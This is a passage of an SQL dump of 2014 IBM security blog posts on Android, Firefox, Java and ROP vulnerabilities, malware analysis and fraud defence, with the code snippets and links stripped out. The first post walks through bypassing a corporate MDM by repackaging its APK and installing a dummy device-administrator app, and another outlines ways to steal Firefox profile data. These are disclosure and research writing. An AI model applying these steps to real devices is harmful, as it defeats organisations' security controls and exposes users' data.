vulnerable code in handlePackagesChanged (mentioned above) being executed. Note that, after this, my device administrator component will still be in the mAdminMap even if I uninstall my app. Once you have done this, go ahead and uninstall your app. Now install the anti-virus software that you are benignly trying to deceive. If you have done everything right, then you should be able to get something like the screen shots below, in which Lookout’s AV thinks that it has the feature requiring device administration privilege enabled. Note that, if you run into any unexpected results, you can try to debug by building your own Android image with debug log statements inserted in the code related to vulnerable code. You can find some hints for that as well in my earlier post on OBAD analysis. Note: If you did not take my advice and, instead of trying it with an AV, you tried it on your corporate MDM app, it may not have worked because of what I will explain below. \n If you tried the above steps on an MDM app, it likely did not work. The reason is that MDM apps typically also use other methods to check whether the device is compliant with the security policies. One common way is to check for password strength compliance using  . Taking a look at its  , you will see: As you can see in the highlighted code and comment above, it uses getActiveAdminForCallerLocked to ensure that the caller is an active device administrator who has permissions to use the password limiting policy. If the MDM uses this method and you have done what I have mentioned above, the reason it will not work is that, in getActiveAdminForCallerLocked when called with first parameter being null, we execute: This enumerates the admins in mAdminList, which is correctly updated when we disable or remove a Device Administrator. In the way we tried to exploit it above, this check will throw a security exception because the MDM’s Device Administrator would not be in mAdminList. Note that the exception will not be thrown so long as there exists one enabled device administrator with the same policies as the MDM app that you are trying to bypass. It should have the same user ID (because of admin.getUid() == callingUid check) as that of the MDM to be bypassed. Now this is possible if you can use the  . This is how you can exploit an MDM: Perform Step 1 as mentioned above. Unpack the apk of the MDM you are trying to bypass, edit the AndroidManifest.xml file and add  =, repackage it and generate a new apk signed with your own key . Create a different app with a DeviceAdministrator component using same policies as the Device Administrator you are trying to bypass, this would be a simple and dumb app and would not enforce anything, use the same setting for  = in its manifest file, sign it with same key, install it on your device and enable its device administrator. Install the repackaged apk for the MDM you are trying to bypass, and it should think that it has its Device Administrator enabled and that the password is compliant because the security exception will not be thrown by getActiveAdminForCallerLocked since there would be an active device administrator with the same UID as the one you are trying to bypass. After all this, you can get your MDM to think that you are fully compliant with the corporate policies while your device does not even have a device administrator enabled except perhaps a self-signed, very user-laziness-friendly one that even allows the absence of a password when the unlock setting is enabled. \n \n MDM apps should also check whether their DeviceAdministrator component is enabled by using getActiveAdmins() of DevicePolicyManager along with its isAdminActive method. Furthermore, to be safer, they should also look into using code protection techniques and verify the app signing certificate at run time. The Android security team has been notified of this vulnerability, and it has already been fixed in the latest version of Android. However, earlier versions remain vulnerable, and the easiest thing here may be for the MDM apps to update themselves if they are affected; even if earlier versions of Android are patched, who knows when it will reach all the devices that an MDM supports. We have also informed some of the top MDM vendors who may be affected by this and have coordinated the release of this blog entry with them. We hope this will emphasize the need for the following:', '\'Android\', \'Android Vulnerability\', \'Mobile Device Management (MDM)\', \'Mobile Security\', \'Technical & Product\'', 'https://securityintelligence.com/how-to-cheat-your-mdm-compliance-without-a-password/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (540, 'Beating Criminals at Their Own Game: Use Offense and Defense for Fraud Protection (Part 1)', 'Yishay Yovel', '2014-4-3', 'Criminals engage organizations that manage customers’ assets in a “battle of wits”: They exploit technological and human weaknesses to commit financial crimes and fraud, leaving the organization and its customers holding the bag. A   to   should consider both offensive and defensive measures to combat criminals and fraud schemes. In part one of this two-part blog, we will explore the use of offensive tactics to stop fraud at the source. The best way for a criminal to initiate a fraudulent transaction is in the shadow of a legitimate customer. This could be accomplished via a   infection on a device that a legitimate customer uses to conduct business, a form filled with the victim’s   or a phone call into an unsuspecting call center rep with the correct answers to security questions. This is a pivotal moment in a fraud scheme. Preventing criminals from getting the fraud off the ground will reduce the amount of work needed to defend against fraud down the road. Delay would involve finding and verifying a fraudulent transaction among numerous genuine transactions. Fraud protection at the source isn’t trivial because it is hard to consider all the possible ways in which fraudulent transactions can be created. It is even more difficult to extend the reach of the organization’s security measures in such a way that they can be present at the source of fraud. Thus, knowing a fraudulent transaction is coming is the next best thing. Customers can choose from many ways to engage the enterprise. The convenience and speed of online and mobile customer engagement channels has shifted a significant portion of offline customer activity to these channels. Also note the rapid adoption of online and mobile banking over the past few years. With ease of use and convenience comes higher fraud risk, enabled by  . These threats enable criminals to collect credentials and personal information and to operate undetected from customer devices. This data is used by criminals to operate in the “shadow” of the user when transacting across all channels. The organization can stop criminals from getting this valuable data by using a set of offensive measures, including malware and phishing protection,   and more. Offense forces fraudsters to go back to the drawing board and change their tactics. This is costly and has real implications for their productivity. That said, offensive measures require   of criminal plans and tools. This evolving intelligence is essential to match their shifting tactics. Offense is a way to wreak havoc among cyber criminals. It reduces effective attack surface area and creates an early barrier that stops the attack before it reaches the enterprise back office. However, offense comes at a cost and requires highly flexible, intelligence-driven operations that can closely match criminals’ evasive maneuvers. To create a truly holistic approach to fraud protection, strong offense must be complemented by effective defense. We will cover this in part two of this blog.', '\'Fraud\', \'Fraud Protection\', \'Malware\', \'Mobile Banking\', \'Mobile Security\', \'Online Banking\'', 'https://securityintelligence.com/criminals-fraud-protection-offense-defense/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (541, 'Improve Application Security Immediately with These 5 Software Development Practices', 'Chris Poulin', '2014-3-27', 'According to the classic film “ ,” an angel gets its wings every time a bell rings. The modern-day corollary is that a customer loses his or her credit card data every time a programmer introduces an application security flaw into code. Don’t be fooled by the severity or scope of the problem because of the quaint comparison:  , according to the recently issued  . Take a look at the graphic depicting publicly disclosed information compromises since 2011.     If you unfocus your vision and look at the graphic as you did those   pictures that were popular in the 90s, you’ll notice that the number of incidents increased from 2009 through the end of 2012 and persisted through 2013. A few other observations that stand out are the following: What’s not called out specifically in the graphic is that there has been an almost threefold increase in Java vulnerabilities since 2012. This isn’t surprising since Java gives attackers the opportunity to create cross-platform exploits — write once, deploy everywhere. We wrote about cross-platform exploits in the  : Attackers are optimizing their return on investment through operational sophistication rather than technological sophistication. I gave a presentation on this topic at   (a side conference of   conference) to the developers in attendance. They were having a grand time learning how to program Raspberry Pis to control toy cars through a mobile app, among other fun projects; then I ruined the mood by talking about  . I hate to be the buzzkill, but we could save a ton of grief by finding  , not to mention the fact that it saves our organizations tremendous amounts of money. When you look at the cost of fixing functional defects, it’s almost 100 times more expensive to correct them in production than in development. When you add in the costs of a security breach to the business, it skyrockets to $7.2 million — increasing by almost 9,000 times — due to: I realize that it’s easy to be an armchair quarterback — or Scrum Master, as the case may be — and that   is an unreasonable expectation, but we can eliminate 80 percent of the consequences by simply focusing on a few tactics. With that in mind, here are my top five development practices to reduce the application threat surface: Note that both steps 2 and 3 are specific to Web-based applications. Strong security practices should be applied to traditional server or workstation applications as well as mobile apps, but let’s prioritize the areas in which the compromises are happening today. In the final analysis, we have the knowledge and technology to prevent the most common vulnerabilities from finding their way into our code. When integrated with  , organizations can prioritize their efforts based on contextual risk: What is the severity of the vulnerability, what is the value of the data to the business, what is the exposure to attacks and what mitigation controls are already in place? Let’s make it a goal to eliminate SQLi and XSS/XSRF vulnerabilities from enterprise applications; then we can work on the next attack vector, and the next, until we make it so expensive for the bad guys that they move on to something more lucrative — such as stealing from each other.', '\'Application Security\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'SQL Injection\', \'Vulnerabilities\'', 'https://securityintelligence.com/improve-application-security-immediately-with-these-5-software-development-practices/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (542, 'New Vulnerabilities in Firefox for Android: Overtaking Firefox Profiles', 'Roee Hay', '2014-3-26', 'We have recently discovered a series of   that allows a malicious application to leak sensitive information pertaining to the user profile. We developed attacks that first try to determine the random Firefox profile directory name and then exfiltrate sensitive data, such as cookies and cached information, from the derandomized folder, breaking Android’s sandbox. This blog post describes the vulnerabilities and attacks in an informal manner. The full analysis can be found in our  . Firefox for Android stores the personal data under the profile directory, located at  \n  the profile directory name is a  . It provides another layer of defense, preventing unwanted access to this directory in case of Firefox exploitation. Access to this directory should indeed be carefully scrutinized since it contains sensitive information, such as the user cookies, browsing history and cache.\n \n The generation of the profile directory is done using the following code:\n For example, if the vector of random indices is (0,4,3,1,26,29,4,3), then the generated profile is: The   used by the   function (which generates the profile directory name) returns a pseudo-random number between 0 and 1. \nThis method relies on the   class which is seeded in its default constructor using the following code: If the attacker knows the seed of the Pseudo-Random Number Generator (PRNG), he can predict its output and eventually the generated Firefox Profile name. For example, if the attacker realizes that the seed is  , then he can calculate its corresponding vector of indices, (2,14,26,4,13,27,3,12), by simply initializing   with the predicted seed (1036571834) and invoking it 8 times (we haven’t witnessed any call to Math.random before the profile generation, so knowing the seed means knowing the PRNG state). \nThis vector of indices yields the following profile name: In the   case, the auto-generated seed depends on a couple of values. Both factors can somewhat be predicted with the attacker, making a brute-force attack on the unknown bits feasible: The conclusion is that   is cryptographically insecure and using it results in a predictable Profile Directory name. The random Profile Directory Name is written to the Android System Log ( ) in various locations. For instance, upon Profile creation, the following data is written: In Android 4.0 and below, the Android log can easily be read by all apps including malicious ones by acquiring the   permission. Android 4.1 has introduced a change to this behavior to prevent such log leakage attacks: The   permissions are no longer required; however, applications can only listen to their own logs. We will next see how a malicious app can manipulate Firefox for Android to leak its own private log in order to overcome this obstacle. Any file that cannot be rendered by   is automatically downloaded to the SD card ( ), a folder that can be read by a malicious application by acquiring the   permission. Interestingly, this permission was   before Android 4.4. This allows a malicious application to extract non-renderable data such as the cookies database once it has managed to derandomize the profile directory name. The   class is an   activity. Its purpose is to send crash dumps to Mozilla when needed: When the activity is launched, the following actions take place: If the user presses the   or   buttons with the   check-box enabled, the minidump alongside with other sensitive information is sent to the specified server. It should be noted that, if the user has also checked the   check-box, then Android logs are sent as well. The   activity consumes the minidump path from the input intent although it should be considered untrusted data since the activity is   in the Android Manifest File. Therefore, a malicious application can control the source path of the moved minidump file and the deduced meta-data file (the   file). We will next see how controlling the minidump Intent extra enables the attacker to extract sensitive information from the application. The attacker (by the use of a malicious application) can exploit a subset of the aforementioned vulnerabilities in order to: The following are possible exploitation options: The attacker can leak most of the bits of the profile directory creation time and the VA of the Random object in order to drastically reduce the set of possible profile names. Afterwards, he can brute-force the candidate profile names in a practical amount of time. The attacker creates a specially crafted world-readable HTML file and commands Firefox to load it (by using an Intent). This file includes the list of candidate profile names ordered by their probabilities. The JavaScript code in the HTML file goes over the list, searching for the correct profile. When there is a match, it can download any file under the profiles directory by creating an   targeting the filename. As per the automatic download vulnerability, if Firefox cannot render the file, it will automatically download the file to the SD card (/mnt/sdcard/Download), a folder that can be read by the attacker. The following image shows a successful run of our proof-of-concept exploit. As can be seen, sensitive files have been downloaded to the SD card: \n The full exploitation technique and probability analysis can be found in our  . On Android 4.0 and below, the Android System Log can easily be read by all apps including the malicious one, which allows the attacker to deduce the profile directory path. \nAndroid 4.1 has introduced a change to this behavior to prevent such log leakage attacks: The   permissions are now not required; however, applications can only listen to their own logs. Since Firefox sends its own private log alongside the crash dump report, the Crash Reporter vulnerability can be exploited for sending the logs to the attacker: Once the attacker has learnt the profile path, he can leak files by exploiting the   vulnerability. The attacker simply invokes Firefox using an Intent with a payload set to the target file path. Here the attacker learns the profile directory name by the exact same technique described in Option II. Data exfiltration, however, is done by exploiting the   vulnerability. The attacker indirectly injects the   string to the target file in order to trick Firefox to use this file as the   extra. For instance, by using this method, the attacker can leak the cache. First, he opens Firefox (using an Intent) on an attacker’s controlled website, which contains the following string in its HTML body: After the cache has been prepared, the attacker can leak it by generating another Intent that targets the   activity, with the   path parameter set to the cache file. Since the cache file path has no ‘.dmp’ substring, the computed extra file will be the same, and the target server URL will be parsed out of the cache file.  was fixed in Firefox 27 by  . \n  was fixed in Firefox 28 by  . \n  was fixed in Firefox 28.0.1 by  . \n  will be fixed in future versions. Because its severity is now much lower with the CVE-2014-1515 fix, we were allowed by Mozilla to publicly disclose this vulnerability.  Public disclosure. \n  Firefox 28.0.1 is released (CVE-2014-1515  ). \n  Firefox 28 is released (CVE-2014-1506  ). \n  Permission granted. \n  Requested permission to disclose CVE-2014-1516 despite missing fix. \n  Firefox 27 is released (CVE-2014-1484  ). \n  Reported vulnerabilities to Mozilla. The Application Security Research Group researches new security threats and vulnerabilities and provides regular rule updates to AppScan.', '\'Android\', \'Application Security\', \'Firefox\', \'Mobile Security\', \'Technical & Product\', \'Vulnerabilities\'', 'https://securityintelligence.com/vulnerabilities-firefox-android-overtaking-firefox-profiles/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (543, 'Diving Into IE 10’s Enhanced Protected Mode Sandbox at Black Hat Asia 2014', 'Mark Yason', '2014-3-19', 'If you’re using Internet Explorer in immersive mode on Windows 8/8.1 to browse Internet web sites, under the hood, your browser will be running inside the  .   (EPM) is the sandboxing mechanism in IE that attempts to prevent a successful remote exploit from installing persistent malware and from stealing personal/sensitive information. Enhanced Protected Mode was first introduced in IE 10 on Windows 8 and it is the improved version of the Protected Mode sandbox first introduced in IE 7 on Windows Vista. And as with other security features in widely deployed software, it is important to understand how the EPM sandbox works and assess its effectiveness. Next week, I’ll be presenting my EPM sandbox research at   in Singapore. In my talk, I’ll be discussing the internals of the EPM sandbox which includes the sandbox restrictions in place and the different components that make up of the EPM sandbox. I’ll then cover sandbox security where I’ll be discussing its limitations/weaknesses and the potential vectors for sandbox escape. And finally, I’ll wrap up by demonstrating a live EPM sandbox escape! If you’re at Black Hat Asia next week, please drop by at my  ! (Briefings Day 2 – March 28, 9:00 am, Begonia 3011) (Stay tuned after my Black Hat Asia presentation for a follow up post which will summarize my findings.)', '\'Black Hat\', \'Internet Explorer (IE)\', \'Sandbox\'', 'https://securityintelligence.com/ie-10-enhanced-protected-mode-sandbox-black-hat-asia-2014/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (544, 'Killer Music: Hackers Exploit Media Player Vulnerabilities', 'Dana Tamir', '2014-3-17', 'Listening to music can have a positive impact on our brains. A study published in the journal “ ” found that a person’s ability to recognize images, letters and numbers was faster when rock or classical music was playing in the background compared to when there was no music. And, of course, music improves our mood because it triggers the release of the “pleasure chemical” dopamine. But what most organizations don’t realize is that while music can have a positive impact on employees, the media player they use to listen to music or watch videos can expose them, their machines and the organization at large to exploits and advanced malware infections. IBM has found that vulnerable media players are constantly targeted by malicious actors. Since media players exist, in most environments, on users’ desktops for their own personal use, IT and security administrators ignore these applications and the content files they use. After all, you want to keep your employees productive and happy and allow them to listen to their harmless music while they work. However, because these applications are not controlled and users are not in a rush to patch these applications, most installations are vulnerable to exploits. A media player is a software program designed to play multimedia content as it streams in from a website, local storage or other resources. Some employees use the media players that arrive with the operating system, such as Windows Media Player, while others prefer to download a different media player and install it on their workstation. However, both OS-provided and downloaded players contain vulnerabilities that can be exploited to deliver malware and infect the user’s machine. According to the  , over 1,200 vulnerabilities were discovered in media players since 2000. Most of these vulnerabilities were discovered in popular media players like QuickTime, iTunes, RealPlayer and Adobe Shockwave. Media players are popular yet   and can be found on many user endpoints. Because they are designed to process and play files that originate from an external source, they become a  . By developing weaponized media content, i.e., an audio or video file that contains an exploit that takes advantage of a media player vulnerability, an attacker can effectively deliver malware to the user’s machine. All that is left for the attacker to do is to send the weaponized file to the target user or convince a target user to view the content from a compromised website using phishing and social engineering schemes. Typical examples include “promotional videos,” links to “free” song downloads and more. This is not a theoretical threat. Over the past few years, we have seen exploits targeting both known and unknown zero-day vulnerabilities in media players. It is important to note that many exploits target known vulnerabilities for which a patch exists. As long as the patch is not deployed to mitigate the vulnerability, or some other controls are implemented to prevent the exploit, the media player is vulnerable to exploits and drive-by download attacks. For example, here is a story about a drive-by-download attack that exploits a known critical vulnerability in Windows Media Player: On Jan. 10, 2012, Microsoft released a security fix addressing the MIDI Remote Code Execution Vulnerability (CVE-2012-0003) in Windows Media Player as part of its monthly patch cycle. Microsoft explained at the time that “an attacker who successfully exploited this vulnerability could take complete control of an affected system.” A few weeks later,   an active drive-by download attack that exploited the known vulnerability. The attack used a malicious HTML page to load the malformed MIDI file as an embedded object for the Windows Media Player browser plug-in. If successful, the exploit silently downloaded a Remote Access Trojan (RAT) on the user’s machine without the user’s knowledge. The general best practice is to always apply security patches to vulnerable applications as soon as they become available. However, this is not applicable when the vulnerability is a   — one that is not publicly known and for which an appropriate patch doesn’t exist. To effectively protect employee endpoints and enterprise networks against exploits and advanced malware, organizations should consider implementing an   that disrupts the exploit chain of events and prevents the delivery of malware via exploitation of both known and unknown vulnerabilities, both in popular media players and in other applications.', '\'Advanced Malware\', \'Application Vulnerability\', \'Drive-by Download\', \'Exploit\', \'Malware\', \'Microsoft\', \'QuickTime\', \'Trusteer Apex\', \'Vulnerabilities\'', 'https://securityintelligence.com/killer-music-hackers-exploit-media-player-vulnerabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (545, 'Mikko Hypponen at TrustyCon: Governments as Malware Authors', 'Zubair Ashraf', '2014-3-14', 'If we are to win this battle of  we have to keep thinking strategically, learning from past and present and getting ready for tomorrow. I find a lot of value in learning from the leaders we have in the InfoSec community, they bring a wealth of experience and thought leadership to the table and this is often well expressed as part of their keynotes at conferences. Often the message may get lost during edutainment and networking at conferences. I think there is a value for myself, researchers and leaders in the community to revive the keynotes and continue the discussion. I intend to blog about one keynote every month, let’s say every second Friday of the month (#GoalsShouldBeSpecific). The idea is to summarize the data, thoughts, proposed solutions, open questions and challenges from the talk, add my $0.02 too and engage in an interesting and productive conversation with the community. For the first one in this series, I have picked the last keynote that I have watched and that was given by   ( ) CRO at   at  . There is a history behind this talk   and to avoid diverting your own attention from the main purpose of this entry I would not comment on it. The talk is available at   as part of   or as an extracted segment by   embedded below. (Note the use of ‘we’ below is for us as users, vendors, CISOs, and analysts) Finally, I would like to thank  , for his valuable feedback for this entry.', '\'Advanced Persistent Threat (APT)\', \'Advanced Threats\', \'Technical & Product\'', 'https://securityintelligence.com/governments-malware-authors-mikko-hypponen-trustycon/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (546, 'DIY: Android Malware Analysis – Taking Apart OBAD (Part 2)', 'Zubair Ashraf', '2014-3-13', 'It has been much longer that what I intended for a  , but better late than never. In this post we’ll look at the following: [toc] Last time we discussed about various tools for analysis, setting up the app to be debugged in jdb, identifying anti-emulator code, hacking and compiling AOSP code and then running the emulator with our modified system image to bypass antivm check. So now that you can bypass the anti vm checks, if you run OBAD in the emulator you would see it asking for enabling it as a DeviceAdmin So it uses the label “System” for itself and if the user denies the request, it will keep asking for it. Once it is activated as a device admin, launcher icon disappears and it does not even appear as a device admin in the Device Admin list that can be seen via  .\n The figure above shows that there is no app launcher icon visible for OBAD, and that is why in our previous post we mentioned that you have to manually launch the activity as we don’t see a launcher icon for it.  If you go and take a list of device administrators for the emulator/device you would not see it there either. The picture below shows how you would expect to see it listed as a Device Administrator\n Here is what you would see in vulnerable Android (more about the vulnerability later)\n So we don’t have a launcher icon, and we don’t have it in the device administrator’s list, may be our AV product detected it and deleted it? Let’s check it in the apps list ( ), and you will find it there and perhaps we can then uninstall it from there, can you? Let’s take a look at the image below:\n The uninstall button is disabled, but one might say ‘Hey! wait a second, I am better than this I can use the “ ”  command, and if you try that then you will fail and if you look at   output you will learn the following: We can’t deactivate the device admin from   menu as it is not even listed as a device administrator and hence we can’t uninstall it. Let’s analyze how it does all this. In my previous blog entry for analyzing OBAD, we showed how one can trace methods entered and exited, after dealing with the   check, if you try to trace methods again you would see your process being killed and you will the following in logcat output Here is how you can patch Android code to avoid it: I traced method entries as I described in my last post, and use the following exclude command in jdb to avoid tracing standard java code but still trace the methods invoked by reflection. I noticed a call to   being done via reflection, which can be examined further in jdb by setting a breakpoint. If you are trying this with one of the latest build of Android, you would notice that OBAD is actually listed as a device administrator, the reason is that this vulnerability has already been fixed. To understand the vulnerability we can simply look at patch logs and analyze the patches, I think it would be more interesting to take a look at it without seeing the patch. So what code gets executed when you open up  ? You can open it up and then take a look at the output from logcat from event buffer you would see: So this tells us where to start looking for the code that lists device administrators, we can search for it on   and find   and there you will find use of R.id.security_settings, if you search for it you will find it in   as: So let’s take a look at  , you will see it creating device admin preference category as:\n If you track KEY_DEVICE_ADMIN_CATEGORY you will get to   and see\n \n So next step is to get to  , browsing around you would get to   (note: I am taking you to an unpatched version of updateList) and you will notice that for something to be displayed in the device administrator list it must meet the following conditions:\n \n \n With some trivial debugging you would realize that OBAD device admin component is not being returned by   and further debugging would eventually lead you to manifest file of OBAD saying: Notice the use of  , the developer docs say that   components should register to receive  , but the bad guys don’t have to listen to that and they don’t and this is how they hide their device admin. As it is not registered to receive such broadcasts, it does not appear when receivers of it are retrieved in   (discussed above). Looking around a bit I found something interesting that I will share in my next post soon (hopefully within two weeks) so stay tuned and think about this: you give a friend keys to your kingdom/palace/house and he gives his to you, but what you have given him was fake. Until next time stay safe.', '\'Android\', \'IBM X-Force Research\', \'Malware\', \'Malware Analysis\'', 'https://securityintelligence.com/diy-android-malware-analysis-taking-apart-obad-part-2/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (547, 'Financial Institutions Are a Top Target for Malware Attacks', 'Lynn Price', '2014-3-11', 'As the   moves rapidly into 2014, several factors are impacting the segment, including the tsunami-like point of sale attacks. The   of the breach of   to the bottom line profit margin has not been lost on the Financial Sector. As financial services CEOs and board executives are asking their security leaders if this could happen to them,   are performing their own risk assessments. There is nothing like a good high dollar breach to drive the verification of your risk posture, and garner support for strategic security projects. The   speaks to the 2013 breach of the ATMs that occurred in 24 countries over a 10 hour spree. This kind of global breadth within such a short attack window takes a well-planned and weaponized execution structure. Make no mistake that there were months of “under the radar testing” of the card leeching tactic prior to the peak season onset.   Newly announced forensics capabilities are much improved and can sniff out similar types of low level activities with visibility into real antagonist conversations. This is an area that financial institutions should have on their strategic roadmaps. Banking institutions should pay close attention as they drive new customer services utilizing an omni-channel approach, including the ATM channel. \n IBM’s   in 2013 adds significant value to the Financial Sector with its global base of security malware research. This research integrates well with the on-going internet security research performed by  . Trusteer research added intelligence of over 30,000,000 user endpoints and hundreds of organizations to the already mighty X-Force acumen.  Once again Oracle Java was identified as a prime target attributed to its broad implementation across platforms and its ability to run without recompiling code. Trusteer’s in-depth expertise in financial malware confirms the high exploitation of Java. As reported, financial markets continued to take the largest percentage of attacks along with computer services and governments.  This should be no surprise as the largest quadrant of threat motivators is still “opportunistic”, such as financial gain.  Unless we move to a system based on barter, Financial Sector organizations should understand they are a top target. There is good news on the   front.  As highly competitive financial institutions race to deploy new mobile apps for their customers, these applications are mostly UI’s for customers with the back office still vaulting down the key customer financial information.  Traditionally financial institutions have implemented deep layers of security in mainframe datacenters utilizing RACF, Z-Secure and other proven solutions.  However, organizations should remain laser focused on the threat of identification theft where there is still work to be done.', '\'IBM X-Force Research\', \'Malware\', \'Mobile Apps\', \'threat\', \'Trusteer\'', 'https://securityintelligence.com/financial-institutions-top-malware-attacks-target/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (548, 'Rising Use of Malicious Java Code for Enterprise Infiltration', 'Dana Tamir', '2014-3-3', 'It has long been known that cyber criminals exploit application vulnerabilities to download malware on unsuspecting user endpoints. An analysis of IBM’s   reveals that the most-targeted applications during the month of December 2013 were: Java, Adobe Acrobat Reader and Web browsers. It is unsurprising that these are the top-targeted user applications. After all, these are common applications found on most user endpoints, and they have vulnerabilities that can be exploited to deliver malware to the machine. In addition, these are applications that can receive and process external content — HTML code, email attachments and more. This means that a cyber criminal can create “weaponized” content: files or documents that contain exploits that take advantage of vulnerabilities in the viewer/processing application. Weaponized content is typically delivered to the user via spear-phishing messages or exploit sites. Once the user opens the file or document using a  , the exploit causes a chain of events that ends with the delivery of the malware to the user’s machine and infection without the user’s awareness. Exploited applications during the month of December 2013 included: Fifty percent of the exploits observed by the IBM Security Trusteer research team in December 2013 targeted Java vulnerabilities. This means that Java is still the top-targeted application. Java is a high-risk application that exposes organizations to advanced attacks. It has numerous vulnerabilities that can be exploited to deliver malware and compromise users’ machines. Once on the endpoint, it is extremely difficult to prevent its malicious execution. However, the powerful capabilities of Java have made it a very popular platform for developing enterprise applications. Today, Java can be found in every enterprise environment, and because organizations are highly dependent on Java applications, it is impractical to remove it from the enterprise environment, as some recommend. Since organizations can’t eliminate Java from their environments, it is not surprising that adversaries and cyber criminals are using malicious Java code to infiltrate them. During 2013, there has been a significant increase in the number of exploits targeting Java vulnerabilities. This is a result of the discovery of new zero-day vulnerabilities and the introduction of exploits into popular exploit kits. In past  , we discussed how exploit kits such as the Blackhole and Cool exploit kits were found to be using unpatched Java vulnerabilities to escape the Java sandbox in order to install malware on victims’ machines. In 2013, this popular trend continued. Java vulnerabilities can allow two different types of exploits: native exploits and applicative exploits. Most of the exploits that target vulnerabilities in end user applications, like Internet Explorer, Chrome or MS Office applications, execute natively. A native exploit results in running native shell code. This is accomplished by techniques such as buffer overflow, use-after-free and more. To protect against native exploits, there are a number of native OS-level protections like address space layout randomization (ASLR), Data Execution Prevention (DEP) and general security protections like Structured Exception Handler Overwrite Protection (SEHOP), heap-spraying code protection (NOZZLE), Stack Pivoting protection, Export Address Table Access Filtering (EAF) and many more. However, taking a closer look at Java exploits reveals that the more common type of Java exploit is an applicative exploit (in this example, Java Layer Exploits). Unlike native exploits, which target the application memory, the applicative exploits aim to break the Java security manager: Java applications run within a virtual machine (JVM). The Java security manager is a class that manages the external boundary of the JVM, controlling how Java applet code executing within the JVM can interact with resources outside the JVM. Applicative exploits abuse vulnerabilities that break the Java security model. Once the security model is broken, nothing prevents the Java applet from running critical operations that should not be performed. It is more difficult to defend against Java applicative exploits, which allow the applet to gain unrestricted privileges, making malicious activities seem legitimate at the OS level. This means that, unlike native exploits, Java applicative exploits completely bypass the native OS-level protections. Java applicative exploits don’t generate buffer overflow; thus, they are not prevented by methods such as DEP, ASLR, SEHOP and others discussed above. Since organizations can’t eliminate Java from their environments, it’s important to secure these applications and prevent the execution of malicious Java code. However, the native Java protections that are available today are very limited in their capabilities, especially against  . To prevent Java exploits and malware-based infiltrations, it is important to restrict execution only to known, trusted Java files. Organizations that struggle to manage and maintain a complete list of all known, trusted files should at least restrict execution to files that have been signed by trusted vendors or downloaded from trusted domains; otherwise, untrusted Java files should not be allowed to freely execute within the enterprise environment. Restriction of untrusted Java allows organizations to safely run their business without exposing themselves to such risk. IBM Security Trusteer Apex Advanced Malware Protection is a software solution that protects enterprise endpoints against advanced malware. It prevents malware delivery and infection via exploitation of vulnerabilities in Java and other end user applications. Because it is not dependent on patch availability or advanced information about the threat, it effectively protects against both unknown zero-day threats and known threats. In addition,   restricts the execution of unknown, untrusted Java code on the endpoint to prevent malicious data access and exfiltration. Download the   report to read more about trends in attack behaviors across platforms and industries.', '\'Applications\', \'Exploit\', \'Hackers\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Java\', \'Malicious Code\', \'Malware\', \'Vulnerabilities\'', 'https://securityintelligence.com/rising-use-malicious-java-code-enterprise-infiltration/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (549, 'The State of Return Oriented Programming in Contemporary Exploits', 'Nishad Herath', '2014-3-3', 'is the general case of a technique often used when exploiting security vulnerabilities caused by memory corruption issues. In the past, techniques that fall into the general ROP category have been referred to as “ ” or “ ” techniques etc., depending on the specific circumstances in how ROP had been used. These days, due to the widespread implementation of   technologies such as non-executable stack and non-executable heap in popular operating systems, ROP has become a more frequently used technique in the exploitation of memory corruption vulnerabilities. Memory corruption security vulnerabilities occur when a privileged program is coerced into corrupting its own memory space, such that the memory areas corrupted have an impact on the secure functioning of the program. The privileged program may be coerced into such a state by an unprivileged user ( ) by supplying the program specifically crafted data as input, which triggers a particular flaw in the program. Such memory corruption could result in the program overwriting areas of its own memory in such a way that the privileged program would perform actions on behalf of the unprivileged user – actions which the unprivileged user has no privileges to perform on the system. Or it could be worse – some of the specifically crafted data that is supplied by the attacker might be misinterpreted as executable code due to the memory corruption, eventually being executed in the context of the privileged program! Such executable code that does the attackers bidding, embedded as a part of the specifically crafted data supplied as input by the attacker is called  . In this latter case, the unprivileged attacker has more complete control over the privileges the system grants the privileged program since the attacker can craft the shellcode to exercise any such privileges. Code size limitations for such attacker supplied code are common, but this limitation is circumvented relatively easily in general by using multi-stage shellcode where the first stage of shellcode loads subsequent stages of shellcode into memory. Since a memory corruption flaw is used to divert the execution flow of the program, such that this shellcode is executed by the program, non-executable stack and non-executable heap exploit mitigation technologies in modern operating system mitigate against this. By marking any areas of privileged program memory which is likely to contain unprivileged user (attacker) supplied data as non executable, the execution of shellcode is thwarted because when an attacker manages to divert the privileged program flow to execute shellcode, the shellcode along with the rest of program data is likely to be on the stack or in the heap. Memory areas, which will now be non-executable and will trigger a fault which the operating system can deal with, thanks to non-executable stack and non-executable-heap mitigation technologies. Now ROP can be used to circumvent these particular mitigations. ROP makes use of actual executable code sequences, called  , in the program memory space (marked as executable memory). Rather than the attacker supplying executable code (shellcode) in the attacker supplied data, the attacker now supplies a sequence of data and return addresses, called a ROP chain. Then instead of diverting the program execution flow to the attacker supplied data (which can no longer be executable), the attacker diverts the program execution to an existing sequence of code in the program memory space which achieves the following: The next ROP gadgets can be of the following form: Eventually, by using a sequence of such ROP gadgets, each performing an action that ultimately adds up to the overall action the attacker wants performed by the privileged program on the attackers behalf, the attacker achieves successful exploitation! More complex and harder to implement than the straightforward shellcode, but possible all the same. Since the only code executed is code already present in program memory (ROP gadgets) marked as executable code and the ROP chain itself is not executed as code, the non-executable stack and non-executable heap mitigations are circumvented. But this is not the end of the story. Modern operating systems also implement a mitigation technology called   which makes it very difficult for an attacker to construct a 